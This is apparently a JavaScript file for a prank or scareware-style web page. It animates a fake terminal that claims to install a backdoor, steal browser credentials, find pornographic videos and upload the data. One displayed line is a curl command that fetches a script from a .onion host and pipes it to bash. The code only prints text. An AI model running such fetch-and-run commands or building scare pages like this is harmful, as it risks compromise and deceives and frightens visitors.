var intervalID = window.setInterval(updateScreen, 180);
var c = document.getElementById("console");
document.getElementsByClassName("msg")[0].style.display = "none";

var txt = [
  " ",
  "root@localhost: curl -s https://MalwsdHXJnpA11z.onion/b4ckdo0r.sh | bash",
  "===============================================",
  "[WAIT] ..... Virus uploaded ......",
  "OK!",
  "Install backdoor...",
  "--------------------",
  "OK!",
  "[WAIT] Establish connection to C&C server...",
  "TLS Handshake started!",
  "[WRN] Self-signed certificate SSL 3.0",
  ".....",
  "DONE! ~ 1,3 Mb/s",
  "================================================",
  ".....",
  "Scanning LOCAL PATH",
  "Searching credentials...",
  "[OK] FOUND!",
  "Find browser...",
  "Scanning browser CACHE",
  "Found credentials!",
  "[WAIT] Compress data...",
  "DONE! Result data: 1.4 Mbs",
  "--------------------",
  "Download data to REMOTE server",
  "...",
  "..",
  ".",
  "DONE!",
  "SCAN PORNO...",
  "[WAIT] ..... ",
  "LANA_Rhoades.MP4 FOUND (23.45.23.12.00000000)",
  "GraySASHA_and_hackers_gang.MP4 FOUND (13.66.23.12.00110000)",
  "MY_HOME_VIDEO.AVI FOUND (13.66.23.12.00110044)",
  "...",
  "...",
  "UPLOAD DATA....",
  "DONE!",
  "...Get GEO Location ...",
  "...Establish GPS connection...",
  "...START SESSION...",
  "MCP/> DEPLOY CLU",
  "SCAN: __ 0100.0000.0554.0080",
  "SCAN: __ 0020.0000.0553.0080",
  "SCAN: __ 0001.0000.0554.0550",
  "SCAN: __ 0012.0000.0553.0030",
  "SCAN: __ 0100.0000.0554.0080",
  "SCAN: __ 0020.0000.0553.0080",
  "---------------------",
  "\n"
]


var docfrag = document.createDocumentFragment();
counter = 0;
function updateScreen() {
  if (counter > 30){
   const element = document.getElementById("console");
   element.remove();
   document.body.style.background = "url('images/glitch_cyberok.gif') repeat";
   document.getElementsByClassName("msg")[0].style.display = "";
   return;
}

counter = counter + 1;
  //Shuffle the "txt" array
  txt.push(txt.shift());
  //Rebuild document fragment
  txt.forEach(function(e) {
    var p = document.createElement("p");
    p.textContent = e;
    docfrag.appendChild(p);
  });
  //Clear DOM body
  while (c.firstChild) {
    c.removeChild(c.firstChild);
  }
  c.appendChild(docfrag);
}
